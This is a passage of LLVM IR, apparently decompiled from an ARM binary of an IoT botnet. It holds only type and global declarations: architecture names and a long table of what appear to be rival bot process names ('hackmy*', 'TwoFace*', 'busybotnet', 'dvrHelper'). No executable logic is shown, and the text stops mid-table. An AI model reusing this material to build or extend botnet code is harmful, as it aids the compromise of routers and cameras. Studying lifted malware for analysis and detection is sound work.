source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.4 = constant i32 -352321502
@global_var_1e00c.8 = global i32 0
@global_var_1e01c.9 = global i32* @global_var_1e00c.8
@global_var_1e7d4.16 = global i32 0
@global_var_1e010.19 = global i32 0
@global_var_9ee0.23 = constant i32 -509558771
@global_var_13570.30 = constant [5 x i8] c"mips\00"
@global_var_13578.31 = constant [7 x i8] c"mips64\00"
@global_var_13580.32 = constant [7 x i8] c"mipsel\00"
@global_var_13588.33 = constant [6 x i8] c"sh2eb\00"
@global_var_13590.34 = constant [7 x i8] c"sh2elf\00"
@global_var_13598.35 = constant [4 x i8] c"sh4\00"
@global_var_1359c.36 = constant [4 x i8] c"x86\00"
@global_var_135a0.37 = constant [4 x i8] c"arm\00"
@global_var_135a4.38 = constant [6 x i8] c"armv5\00"
@global_var_135ac.39 = constant [8 x i8] c"armv4tl\00"
@global_var_135b4.40 = constant [6 x i8] c"armv4\00"
@global_var_135bc.41 = constant [6 x i8] c"armv6\00"
@global_var_135c4.42 = constant [5 x i8] c"i686\00"
@global_var_135cc.43 = constant [8 x i8] c"powerpc\00"
@global_var_135d4.44 = constant [13 x i8] c"powerpc440fp\00"
@global_var_135e4.45 = constant [5 x i8] c"i586\00"
@global_var_135ec.46 = constant [5 x i8] c"m68k\00"
@global_var_135f4.47 = constant [6 x i8] c"sparc\00"
@global_var_135fc.48 = constant [7 x i8] c"x86_64\00"
@global_var_13604.49 = constant [11 x i8] c"jackmymips\00"
@global_var_13610.50 = constant [13 x i8] c"jackmymips64\00"
@global_var_13620.51 = constant [13 x i8] c"jackmymipsel\00"
@global_var_13630.52 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1363c.53 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1364c.54 = constant [10 x i8] c"jackmysh4\00"
@global_var_13658.55 = constant [10 x i8] c"jackmyx86\00"
@global_var_13664.56 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_13670.57 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_13680.58 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1368c.59 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_13698.60 = constant [11 x i8] c"jackmyi686\00"
@global_var_136a4.61 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_136b4.62 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_136c8.63 = constant [11 x i8] c"jackmyi586\00"
@global_var_136d4.64 = constant [11 x i8] c"jackmym68k\00"
@global_var_136e0.65 = constant [12 x i8] c"jackmysparc\00"
@global_var_136ec.66 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_136fc.67 = constant [11 x i8] c"hackmymips\00"
@global_var_13708.68 = constant [13 x i8] c"hackmymips64\00"
@global_var_13718.69 = constant [13 x i8] c"hackmymipsel\00"
@global_var_13728.70 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_13734.71 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_13744.72 = constant [10 x i8] c"hackmysh4\00"
@global_var_13750.73 = constant [10 x i8] c"hackmyx86\00"
@global_var_1375c.74 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_13768.75 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_13778.76 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_13784.77 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_13790.78 = constant [11 x i8] c"hackmyi686\00"
@global_var_1379c.79 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_137ac.80 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_137c0.81 = constant [11 x i8] c"hackmyi586\00"
@global_var_137cc.82 = constant [11 x i8] c"hackmym68k\00"
@global_var_137d8.83 = constant [12 x i8] c"hackmysparc\00"
@global_var_137e4.84 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_137f4.85 = constant [3 x i8] c"b1\00"
@global_var_137f8.86 = constant [3 x i8] c"b2\00"
@global_var_137fc.87 = constant [3 x i8] c"b3\00"
@global_var_13800.88 = constant [3 x i8] c"b4\00"
@global_var_13804.89 = constant [3 x i8] c"b5\00"
@global_var_13808.90 = constant [3 x i8] c"b6\00"
@global_var_1380c.91 = constant [3 x i8] c"b7\00"
@global_var_13810.92 = constant [3 x i8] c"b8\00"
@global_var_13814.93 = constant [3 x i8] c"b9\00"
@global_var_13818.94 = constant [4 x i8] c"b10\00"
@global_var_1381c.95 = constant [4 x i8] c"b11\00"
@global_var_13820.96 = constant [4 x i8] c"b12\00"
@global_var_13824.97 = constant [4 x i8] c"b13\00"
@global_var_13828.98 = constant [4 x i8] c"b14\00"
@global_var_1382c.99 = constant [4 x i8] c"b15\00"
@global_var_13830.100 = constant [4 x i8] c"b16\00"
@global_var_13834.101 = constant [4 x i8] c"b17\00"
@global_var_13838.102 = constant [4 x i8] c"b18\00"
@global_var_1383c.103 = constant [4 x i8] c"b19\00"
@global_var_13840.104 = constant [4 x i8] c"b20\00"
@global_var_13844.105 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_13858.106 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_13864.107 = constant [10 x i8] c"dvrHelper\00"
@global_var_13870.108 = constant [8 x i8] c"FDFDHFC\00"
@global_var_13878.109 = constant [5 x i8] c"FEUB\00"
@global_var_13880.110 = constant [9 x i8] c"FTUdftui\00"
@global_var_1388c.111 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_13898.112 = constant [6 x i8] c"jhUOH\00"
@global_var_138a0.113 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_138ac.114 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_138b8.115 = constant [8 x i8] c"kmymips\00"
@global_var_138c0.116 = constant [10 x i8] c"kmymips64\00"
@global_var_138cc.117 = constant [10 x i8] c"kmymipsel\00"
@global_var_138d8.118 = constant [9 x i8] c"kmysh2eb\00"
@global_var_138e4.119 = constant [10 x i8] c"kmysh2elf\00"
@global_var_138f0.120 = constant [7 x i8] c"kmysh4\00"
@global_var_138f8.121 = constant [7 x i8] c"kmyx86\00"
@global_var_13900.122 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1390c.123 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_13918.124 = constant [9 x i8] c"kmyarmv4\00"
@global_var_13924.125 = constant [9 x i8] c"kmyarmv6\00"
@global_var_13930.126 = constant [8 x i8] c"kmyi686\00"
@global_var_13938.127 = constant [11 x i8] c"kmypowerpc\00"
@global_var_13944.128 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_13954.129 = constant [8 x i8] c"kmyi586\00"
@global_var_1395c.130 = constant [8 x i8] c"kmym68k\00"
@global_var_13964.131 = constant [9 x i8] c"kmysparc\00"
@global_var_13970.132 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1397c.133 = constant [8 x i8] c"lolmips\00"
@global_var_13984.134 = constant [10 x i8] c"lolmips64\00"
@global_var_13990.135 = constant [10 x i8] c"lolmipsel\00"
@global_var_1399c.136 = constant [9 x i8] c"lolsh2eb\00"
@global_var_139a8.137 = constant [10 x i8] c"lolsh2elf\00"
@global_var_139b4.138 = constant [7 x i8] c"lolsh4\00"
@global_var_139bc.139 = constant [7 x i8] c"lolx86\00"
@global_var_139c4.140 = constant [9 x i8] c"lolarmv5\00"
@global_var_139d0.141 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_139dc.142 = constant [9 x i8] c"lolarmv4\00"
@global_var_139e8.143 = constant [9 x i8] c"lolarmv6\00"
@global_var_139f4.144 = constant [8 x i8] c"loli686\00"
@global_var_139fc.145 = constant [11 x i8] c"lolpowerpc\00"
@global_var_13a08.146 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_13a18.147 = constant [8 x i8] c"loli586\00"
@global_var_13a20.148 = constant [8 x i8] c"lolm68k\00"
@global_var_13a28.149 = constant [9 x i8] c"lolsparc\00"
@global_var_13a34.150 = constant [8 x i8] c"RYrydry\00"
@global_var_13a3c.151 = constant [8 x i8] c"telmips\00"
@global_var_13a44.152 = constant [10 x i8] c"telmips64\00"
@global_var_13a50.153 = constant [10 x i8] c"telmipsel\00"
@global_var_13a5c.154 = constant [9 x i8] c"telsh2eb\00"
@global_var_13a68.155 = constant [10 x i8] c"telsh2elf\00"
@global_var_13a74.156 = constant [7 x i8] c"telsh4\00"
@global_var_13a7c.157 = constant [7 x i8] c"telx86\00"
@global_var_13a84.158 = constant [9 x i8] c"telarmv5\00"
@global_var_13a90.159 = constant [11 x i8] c"telarmv4tl\00"
@global_var_13a9c.160 = constant [9 x i8] c"telarmv4\00"
@global_var_13aa8.161 = constant [9 x i8] c"telarmv6\00"
@global_var_13ab4.162 = constant [8 x i8] c"teli686\00"
@global_var_13abc.163 = constant [11 x i8] c"telpowerpc\00"
@global_var_13ac8.164 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_13ad8.165 = constant [8 x i8] c"teli586\00"
@global_var_13ae0.166 = constant [8 x i8] c"telm68k\00"
@global_var_13ae8.167 = constant [9 x i8] c"telsparc\00"
@global_var_13af4.168 = constant [10 x i8] c"telx86_64\00"
@global_var_13b00.169 = constant [12 x i8] c"TwoFacemips\00"
@global_var_13b0c.170 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_13b1c.171 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_13b2c.172 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_13b3c.173 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_13b4c.174 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_13b58.175 = constant [11 x i8] c"TwoFacex86\00"
@global_var_13b64.176 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_13b74.177 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_13b84.178 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_13b94.179 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_13ba4.180 = constant [12 x i8] c"TwoFacei686\00"
@global_var_13bb0.181 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_13bc0.182 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_13bd4.183 = constant [12 x i8] c"TwoFacei586\00"
@global_var_13be0.184 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_13bec.185 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_13bfc.186 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_13c0c.187 = constant [9 x i8] c"UYyuyioy\00"
@global_var_13c18.188 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_13c24.189 = constant [5 x i8] c"xxb1\00"
@global_var_13c2c.190 = constant [5 x i8] c"xxb2\00"
@global_var_13c34.191 = constant [5 x i8] c"xxb3\00"
@global_var_13c3c.192 = constant [5 x i8] c"xxb4\00"
@global_var_13c44.193 = constant [5 x i8] c"xxb5\00"
@global_var_13c4c.194 = constant [5 x i8] c"xxb6\00"
@global_var_13c54.195 = constant [5 x i8] c"xxb7\00"
@global_var_13c5c.196 = constant [5 x i8] c"xxb8\00"
@global_var_13c64.197 = constant [5 x i8] c"xxb9\00"
@global_var_13c6c.198 = constant [6 x i8] c"xxb10\00"
@global_var_13c74.199 = constant [6 x i8] c"xxb11\00"
@global_var_13c7c.200 = constant [6 x i8] c"xxb12\00"
@global_var_13c84.201 = constant [6 x i8] c"xxb13\00"
@global_var_13c8c.202 = constant [6 x i8] c"xxb14\00"
@global_var_13c94.203 = constant [6 x i8] c"xxb15\00"
@global_var_13c9c.204 = constant [6 x i8] c"xxb16\00"
@global_var_13ca4.205 = constant [6 x i8] c"xxb17\00"
@global_var_13cac.206 = constant [6 x i8] c"xxb18\00"
@global_var_13cb4.207 = constant [6 x i8] c"xxb19\00"
@global_var_13cbc.208 = constant [6 x i8] c"xxb20\00"
@global_var_13cc4.209 = constant i32 49
@global_var_13cc8.210 = constant i32 50
@global_var_13ccc.211 = constant i32 51
@global_var_13cd0.212 = constant i32 52
@global_var_13cd4.213 = constant i32 53
@global_var_13cd8.214 = constant i32 54
@global_var_13cdc.215 = constant i32 55
@global_var_13ce0.216 = constant i32 56
@global_var_13ce4.217 = constant i32 57
@global_var_13ce8.218 = constant [3 x i8] c"10\00"
@global_var_13cec.219 = constant [3 x i8] c"11\00"
@global_var_13cf0.220 = constant [3 x i8] c"12\00"
@global_var_13cf4.221 = constant [3 x i8] c"13\00"
@global_var_13cf8.222 = constant [3 x i8] c"14\00"
@global_var_13cfc.223 = constant [3 x i8] c"15\00"
@global_var_13d00.224 = constant [3 x i8] c"16\00"
@global_var_13d04.225 = constant [3 x i8] c"17\00"
@global_var_13d08.226 = constant [3 x i8] c"18\00"
@global_var_13d0c.227 = constant [3 x i8] c"19\00"
@global_var_13d10.228 = constant [3 x i8] c"20\00"
@global_var_13d14.229 = constant [3 x i8] c"bb\00"
@global_var_13d18.230 = constant [11 x i8] c"busybotnet\00"
@global_var_13d24.231 = constant [5 x i8] c"pppd\00"
@global_var_13d2c.232 = constant [6 x i8] c"pppoe\00"
@global_var_13d34.233 = constant [5 x i8] c"wput\00"
@global_var_13d3c.234 = constant [3 x i8] c"B1\00"
@global_var_13d40.235 = constant [3 x i8] c"B2\00"
@global_var_13d44.236 = constant [3 x i8] c"B3\00"
@global_var_13d48.237 = constant [3 x i8] c"B4\00"
@global_var_13d4c.238 = constant [3 x i8] c"B5\00"
@global_var_13d50.239 = constant [3 x i8] c"B6\00"
@global_var_13d54.240 = constant [3 x i8] c"B7\00"
@global_var_13d58.241 = constant [3 x i8] c"B8\00"
@global_var_13d5c.242 = constant [3 x i8] c"B9\00"
@global_var_13d60.243 = constant [4 x i8] c"B10\00"
@global_var_13d64.244 = constant [4 x i8] c"B11\00"
@global_var_13d68.245 = constant [4 x i8] c"B12\00"
@global_var_13d6c.246 = constant [4 x i8] c"B13\00"
@global_var_13d70.247 = constant [4 x i8] c"B14\00"
@global_var_13d74.248 = constant [4 x i8] c"B15\00"
@global_var_13d78.249 = constant [4 x i8] c"B16\00"
@global_var_13d7c.250 = constant [4 x i8] c"B17\00"
@global_var_13d80.251 = constant [4 x i8] c"B18\00"
@global_var_13d84.252 = constant [9 x i8] c"B20hackz\00"
@global_var_13d90.253 = constant [5 x i8] c"bin*\00"
@global_var_13d98.254 = constant [5 x i8] c"gtop\00"
@global_var_13da0.255 = constant [5 x i8] c"ftp*\00"
@global_var_13da8.256 = constant [6 x i8] c"tftp*\00"
@global_var_13db0.257 = constant [7 x i8] c"botnet\00"
@global_var_13db8.258 = constant [8 x i8] c"swatnet\00"
@global_var_13dc0.259 = constant [8 x i8] c"ballpit\00"
@global_var_13dc8.260 = constant [8 x i8] c"fucknet\00"
@global_var_13dd0.261 = constant [9 x i8] c"cracknet\00"
@global_var_13ddc.262 = constant [8 x i8] c"weednet\00"
@global_var_13de4.263 = constant [7 x i8] c"gaynet\00"
@global_var_13dec.264 = constant [9 x i8] c"queernet\00"
@global_var_13df8.265 = constant [8 x i8] c"ballnet\00"
@global_var_13e00.266 = constant [5 x i8] c"unet\00"
@global_var_13e08.267 = constant [7 x i8] c"yougay\00"
@global_var_13e10.268 = constant [7 x i8] c"sttftp\00"
@global_var_13e18.269 = constant [7 x i8] c"sstftp\00"
@global_var_13e20.270 = constant [7 x i8] c"sbtftp\00"
@global_var_13e28.271 = constant [6 x i8] c"btftp\00"
@global_var_13e30.272 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_13e3c.273 = constant [6 x i8] c"bruv*\00"
@global_var_13e44.274 = constant [5 x i8] c"IoT*\00"
@global_var_1e024.275 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13570.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13578.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13580.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13588.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13590.34, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13598.35, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1359c.36, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_135a0.37, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_135a4.38, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_135ac.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_135b4.40, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_135bc.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_135c4.42, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_135cc.43, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_135d4.44, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_135e4.45, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_135ec.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_135f4.47, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_135fc.48, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13604.49, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13610.50, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13620.51, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13630.52, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1363c.53, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1364c.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13658.55, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13664.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13670.57, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13680.58, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1368c.59, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13698.60, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_136a4.61, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_136b4.62, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_136c8.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_136d4.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_136e0.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_136ec.66, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_136fc.67, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13708.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13718.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13728.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13734.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13744.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13750.73, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1375c.74, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_13768.75, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13778.76, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_13784.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13790.78, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1379c.79, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_137ac.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_137c0.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_137cc.82, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_137d8.83, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_137e4.84, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_137f4.85, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_137f8.86, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_137fc.87, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13800.88, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13804.89, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13808.90, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1380c.91, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13810.92, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13814.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13818.94, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1381c.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13820.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13824.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13828.98, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1382c.99, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13830.100, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13834.101, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13838.102, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1383c.103, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13840.104, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_13844.105, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13858.106, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13864.107, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13870.108, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13878.109, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13880.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1388c.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13898.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_138a0.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_138ac.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_138b8.115, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_138c0.116, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_138cc.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_138d8.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_138e4.119, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_138f0.120, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_138f8.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13900.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1390c.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13918.124, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13924.125, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13930.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13938.127, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13944.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13954.129, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1395c.130, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13964.131, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13970.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1397c.133, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13984.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13990.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1399c.136, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_139a8.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_139b4.138, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_139bc.139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_139c4.140, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_139d0.141, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_139dc.142, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_139e8.143, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_139f4.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_139fc.145, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13a08.146, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13a18.147, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13a20.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13a28.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13a34.150, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13a3c.151, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13a44.152, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13a50.153, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13a5c.154, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13a68.155, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13a74.156, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13a7c.157, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13a84.158, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13a90.159, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13a9c.160, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13aa8.161, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13ab4.162, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13abc.163, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13ac8.164, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x 